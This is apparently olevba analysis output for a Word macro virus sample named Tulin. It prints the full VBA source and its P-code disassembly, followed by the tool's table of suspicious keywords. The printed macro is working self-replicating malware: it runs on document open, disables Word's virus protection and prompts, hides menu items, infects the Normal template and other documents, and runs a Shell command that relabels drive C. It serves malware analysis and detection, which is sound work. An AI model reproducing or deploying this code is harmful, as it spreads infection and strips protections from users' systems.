olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tulin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO tulin.cls 
in file: Virus.MSWord.Tulin - OLE stream: 'Macros/VBA/tulin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Rem " Murat mgd "
Rem " this is for tulin "
On Error Resume Next

Application.EnableCancelKey = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0

CommandBars("Tools").Controls("Macro").Visible = 0
CommandBars("Tools").Controls("Templates and Add-Ins...").Visible = 0

inf_normal = False
inf_activ = False

If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "tulin" Then
   inf_normal = True
End If

If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "tulin" Then
   inf_activ = True
End If

If inf_normal <> True And inf_activ <> True Then
   GoTo vir_exit
End If

If inf_normal Then
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\mgd.sys"
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\mgd.sys")
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Sub AutoClose()"
    NormalTemplate.VBProject.VBComponents.Item(1).Name = "tulin"
End If

If inf_activ Then
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\mgd.sys")
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
    ActiveDocument.VBProject.VBComponents.Item(1).Name = "tulin"
End If

vir_exit:

save_flag = False

If (Month(Date) = 2 And Day(Date) = 14) Or (Month(Date) = 9 And Day(Date) = 28) Or (Month(Date) = 11 And Day(Date) = 6) Then
    Selection.Paragraphs.Add
    Selection.Font.Bold = True
    Selection.Font.Size = 14
    Selection.TypeText Text:="You Give Your Heart Today Tomorrow and Forever "
    save_flag = True
End If

With Dialogs(wdDialogFileSummaryInfo)
    .Comments = "my namber is 666"
    .Execute
End With

Shell ("label c:TULIN"), 0

If (inf_normal <> True And inf_activ = True) Or save_flag = True Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tulin
' ===============================================================================
' Module streams:
' Macros/VBA/tulin - 3856 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Rem 0x000E " " Murat mgd ""
' Line #2:
' 	Rem 0x0016 " " this is for tulin ""
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #11:
' 	LitDI2 0x0000 
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #12:
' Line #13:
' 	LitVarSpecial (False)
' 	St inf_normal 
' Line #14:
' 	LitVarSpecial (False)
' 	St inf_activ 
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "tulin"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	LitVarSpecial (True)
' 	St inf_normal 
' Line #18:
' 	EndIfBlock 
' Line #19:
' Line #20:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "tulin"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitVarSpecial (True)
' 	St inf_activ 
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' 	Ld inf_normal 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld inf_activ 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #25:
' 	GoTo vir_exit 
' Line #26:
' 	EndIfBlock 
' Line #27:
' Line #28:
' 	Ld inf_normal 
' 	IfBlock 
' Line #29:
' 	LitStr 0x000A "c:\mgd.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #30:
' 	LitStr 0x000A "c:\mgd.sys"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #31:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #32:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #33:
' 	LitStr 0x0005 "tulin"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	Ld inf_activ 
' 	IfBlock 
' Line #37:
' 	LitStr 0x000A "c:\mgd.sys"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #38:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #39:
' 	LitStr 0x0005 "tulin"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	Label vir_exit 
' Line #43:
' Line #44:
' 	LitVarSpecial (False)
' 	St save_flag 
' Line #45:
' Line #46:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #47:
' 	Ld Selection 
' 	MemLd Paragraphs 
' 	ArgsMemCall Add 0x0000 
' Line #48:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #49:
' 	LitDI2 0x000E 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #50:
' 	LitStr 0x002F "You Give Your Heart Today Tomorrow and Forever "
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #51:
' 	LitVarSpecial (True)
' 	St save_flag 
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #55:
' 	LitStr 0x0010 "my namber is 666"
' 	MemStWith Comments 
' Line #56:
' 	ArgsMemCallWith Execute 0x0000 
' Line #57:
' 	EndWith 
' Line #58:
' Line #59:
' 	LitStr 0x000D "label c:TULIN"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #60:
' Line #61:
' 	Ld inf_normal 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld inf_activ 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	Ld save_flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #62:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' Line #65:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

